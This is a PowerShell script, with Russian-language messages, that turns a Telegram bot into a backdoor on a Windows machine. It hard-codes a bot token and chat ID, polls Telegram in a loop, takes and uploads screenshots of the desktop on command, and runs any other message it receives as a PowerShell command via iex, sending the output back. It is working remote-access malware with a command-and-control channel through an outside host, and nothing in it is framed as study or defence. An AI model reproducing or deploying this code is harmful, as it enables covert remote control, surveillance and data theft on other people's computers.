[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
$botToken = "8220355086:AAFI1_k4FoKIF18FShBBn0yezO5dDldzs88"
$chatId = "6494641721"
$apiUrl = "https://api.telegram.org/bot$botToken"

function Send-TG ($t, $isPath=$false) {
    if($isPath){ curl.exe -s -F "chat_id=$chatId" -F "photo=@$t" "$apiUrl/sendPhoto" }
    else {
        $b = @{chat_id=$chatId; text="[$env:COMPUTERNAME] $t"; parse_mode="Markdown"}
        Invoke-RestMethod -Uri "$apiUrl/sendMessage" -Method Post -Body $b -Proxy $null
    }
}

Send-TG "🚀 *Агент запущен!*`nНапиши /help для списка команд."
$lastId = 0

while ($true) {
    try {
        $res = Invoke-RestMethod -Uri "$apiUrl/getUpdates?offset=$($lastId + 1)&timeout=20" -Proxy $null
        foreach ($u in $res.result) {
            $lastId = $u.update_id
            $msg = $u.message.text
            if ($u.message.from.id -eq $chatId) {
                switch ($msg) {
                    "/start" { Send-TG "✅ Система готова к приему команд." }
                    "/help"  { Send-TG "📜 *Команды:*`n`n🔹 *shot* - скриншот`n🔹 *kill* - выключить`n🔹 *команда* - выполнить в PS" }
                    "shot" {
                        Send-TG "📸 Делаю снимок..."
                        Add-Type -AssemblyName System.Windows.Forms,System.Drawing
                        $s = [Windows.Forms.Screen]::PrimaryScreen.Bounds
                        $b = New-Object Drawing.Bitmap($s.Width, $s.Height)
                        $g = [Drawing.Graphics]::FromImage($b)
                        $g.CopyFromScreen($s.X, $s.Y, 0, 0, $s.Size)
                        $tmp = "$env:TEMP\s.png"; $b.Save($tmp, [Drawing.Imaging.ImageFormat]::Png)
                        $g.Dispose(); $b.Dispose()
                        Send-TG $tmp $true
                        if(Test-Path $tmp){ rm $tmp }
                    }
                    "kill" { Send-TG "💀 Завершаю работу."; exit }
                    default {
                        try {
                            $out = iex $msg 2>&1 | Out-String
                            $resOut = if ([string]::IsNullOrWhiteSpace($out)) { "✅ Выполнено" } else { "🖥 *Ответ:*`n$out" }
                            Send-TG $resOut
                        } catch { Send-TG "❌ Ошибка: $($_.Exception.Message)" }
                    }
                }
            }
        }
    } catch { Start-Sleep -Seconds 5 }
}
